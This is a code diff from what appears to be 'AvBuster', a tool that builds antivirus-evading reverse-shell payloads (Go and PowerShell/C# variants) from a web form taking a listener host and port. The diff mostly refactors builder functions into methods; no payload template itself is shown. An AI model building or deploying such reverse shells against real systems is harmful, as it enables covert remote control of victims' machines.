-func processcustomgo(req *http.Request) {
+func (currentuservals *UserValues) processcustomgo(req *http.Request) {
 	var targetarchtype, controllerarchtype string
 	err := req.ParseForm()
 	checkerror(err)
@@ -1076,7 +1107,7 @@ func processcustomgo(req *http.Request) {
 	} else {
 		controllerarchtype = "amd64"
 	}
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.targetos = targetostype
@@ -1090,15 +1121,15 @@ func processcustomgo(req *http.Request) {
 	manageroutpath = "outfiles" + string(os.PathSeparator) + "customgorevshellmanager.go"
 	currentuservals.binarytemplate = binarytemplates.AvBusterCustomGoReverseShell
 	fmt.Println("building customgo revshell")
-	createavbusterpayload(currentuservals, false, false)
+	currentuservals.createavbusterpayload(false, false)
 	currentuservals.binarytemplate = binarytemplates.AvBusterCustomGoReverseShellManager
-	createavbusterpayload(currentuservals, true, false)
+	currentuservals.createavbusterpayload(true, false)
 
 	os.Remove(outpath)
 	os.Remove(manageroutpath)
 }
 
-func processpsrevshellbuild(req *http.Request) {
+func (currentuservals *UserValues) processpsrevshellbuild(req *http.Request) {
 	saveas := req.Form.Get("saveas")
 	if strings.TrimSpace(saveas) == "" {
 		saveas = "noname"
@@ -1107,7 +1138,7 @@ func processpsrevshellbuild(req *http.Request) {
 	lhost := req.Form.Get("lhost")
 	lport := req.Form.Get("lport")
 	apptype := req.Form.Get("shelltype")
-	currentuservals := UserValues{}
+	//currentuservals := UserValues{}
 	currentuservals.lhost = lhost
 	currentuservals.lport = lport
 	currentuservals.apptype = apptype
@@ -1119,13 +1150,13 @@ func processpsrevshellbuild(req *http.Request) {
 		outpath = "outfiles" + string(os.PathSeparator) + "powrevtcp.cs"
 		currentuservals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShellCS
 		fmt.Println("building psrevshell")
-		createavbusterpayload(currentuservals, false, true)
+		currentuservals.createavbusterpayload(false, true)
 
 	} else {
 		outpath = "outfiles" + string(os.PathSeparator) + "psrevgui.cs"
 		currentuservals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShellGUI
 		fmt.Println("building GUI psrevshell")
-		createavbusterGUIpayload(currentuservals, false)
+		currentuservals.createavbusterGUIpayload(false)
 	}
 
 	os.Remove(outpath)
